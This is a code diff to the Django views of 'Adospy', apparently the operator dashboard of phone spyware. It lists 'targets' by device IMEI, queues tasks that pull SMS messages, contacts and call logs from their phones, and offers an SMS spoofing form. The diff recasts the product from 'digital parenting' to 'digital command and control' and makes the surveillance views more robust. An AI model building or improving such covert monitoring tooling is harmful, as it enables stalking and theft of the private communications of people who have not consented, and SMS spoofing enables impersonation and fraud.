@@ -17,6 +17,7 @@ from django.contrib.auth import authenticate, login
 from django.contrib.auth.mixins import LoginRequiredMixin
 from collections import defaultdict
 
+
 class SigninView(InertiaView):
     template_name = "SignIn"
 
@@ -127,7 +128,7 @@ class SignUpView(InertiaView):
             message = f'''
             Hello {first_name} {last_name},
 
-            Welcome to Adospy – your trusted platform for digital parenting.
+            Welcome to Adospy – your trusted platform for digital command and control.
 
             Please verify your email by clicking the link below:
 
@@ -151,6 +152,15 @@ class SignUpView(InertiaView):
                 "first_name": "Invalid credentials"
             }
         })
+
+
+class SignOutView(LoginRequiredMixin, InertiaView):
+    login_url = "/signin"
+
+    def get(self, request, *args, **kwargs):
+        from django.contrib.auth import logout
+        logout(request)
+        return redirect("signin")
 
 
 class VerifyEmailView(InertiaView):
@@ -286,9 +296,10 @@ class TargetsView(LoginRequiredMixin, InertiaView):
         try:
             target = Target.objects.get(id=target_id, user=user)
             target.delete()
-            redirect("targets")
+            return redirect("targets")
         except Target.DoesNotExist:
-            redirect("targets")
+            return redirect("targets")
+
 
 class MessagesView(LoginRequiredMixin, InertiaView):
     template_name = "Messages"
@@ -296,8 +307,14 @@ class MessagesView(LoginRequiredMixin, InertiaView):
 
     def get_props(self):
         user = self.request.user
-        target = Target.objects.get(status="active", user=user)
-        messages = SMSMessages.objects.filter(target=target).order_by("date").values()
+        try:
+            target = Target.objects.get(status="active", user=user)
+        except Target.DoesNotExist:
+            return {
+                "messages": {}
+            }
+        messages = SMSMessages.objects.filter(
+            target=target).order_by("date").values()
 
         # Step 1: Group messages by address
         grouped = defaultdict(list)
@@ -310,12 +327,14 @@ class MessagesView(LoginRequiredMixin, InertiaView):
 
         # Step 3: Sort the groups by the most recent message (descending)
         sorted_grouped = dict(
-            sorted(grouped.items(), key=lambda x: x[1][-1]['date'], reverse=True)
+            sorted(grouped.items(),
+                   key=lambda x: x[1][-1]['date'], reverse=True)
         )
 
         return {
             "messages": sorted_grouped
         }
+
 
 class SyncTargetView(LoginRequiredMixin, InertiaView):
     login_url = "/signin"
@@ -328,26 +347,29 @@ class SyncTargetView(LoginRequiredMixin, InertiaView):
             target = Target.objects.get(status="active", user=user)
         except Target.DoesNotExist:
             return redirect("targets")
-      
+
         if sync_type == "sms":
             fetch_sms.delay(target.id, target.device_imei, target.license_key)
             return redirect("messages")
         elif sync_type == "contacts":
-            fetch_contacts_socket.delay(target.id, target.device_imei, target.license_key)
+            fetch_contacts_socket.delay(
+                target.id, target.device_imei, target.license_key)
             return redirect("contacts")
         elif sync_type == "call_logs":
-            fetch_call_logs_socket.delay(target.id, target.device_imei, target.license_key)
+            fetch_call_logs_socket.delay(
+                target.id, target.device_imei, target.license_key)
             return redirect("call-logs")
 
         return redirect("targets")
+
 
 class SpoofSMSView(LoginRequiredMixin, InertiaView):
     template_name = "SpoofSms"
     login_url = "/signin"
 
     def get_props(self):
-        return{}
-    
+        return {}
+
     def post(self, request, *args, **kwargs):
         form = SpoofSMSForm(json.loads(request.body))
 
@@ -374,18 +396,26 @@ class SpoofSMSView(LoginRequiredMixin, InertiaView):
             return render(request, self.template_name, props=self.get_props())
         return render(request, self.template_name, props=self.get_props())
 
+
 class ContactsView(LoginRequiredMixin, InertiaView):
     template_name = "Contacts"
     login_url = "/signin"
 
     def get_props(self):
         user = self.request.user
-        target = Target.objects.get(status="active", user=user)
-        contacts = Contacts.objects.filter(target=target).order_by("name").values()
+        try:
+            target = Target.objects.get(status="active", user=user)
+        except Target.DoesNotExist:
+            return {
+                "contacts": []
+            }
+        contacts = Contacts.objects.filter(
+            target=target).order_by("name").values()
 
         return {
             "contacts": contacts
         }
+
 
 class CallLogsView(LoginRequiredMixin, InertiaView):
     template_name = "CallLogs"
@@ -393,8 +423,14 @@ class CallLogsView(LoginRequiredMixin, InertiaView):
 
     def get_props(self):
         user = self.request.user
-        target = Target.objects.get(status="active", user=user)
-        call_logs = CallLogs.objects.filter(target=target).order_by("date").values()
+        try:
+            target = Target.objects.get(status="active", user=user)
+        except Target.DoesNotExist:
+            return {
+                "call_logs": []
+            }
+        call_logs = CallLogs.objects.filter(
+            target=target).order_by("date").values()
 
         return {
             "call_logs": call_logs
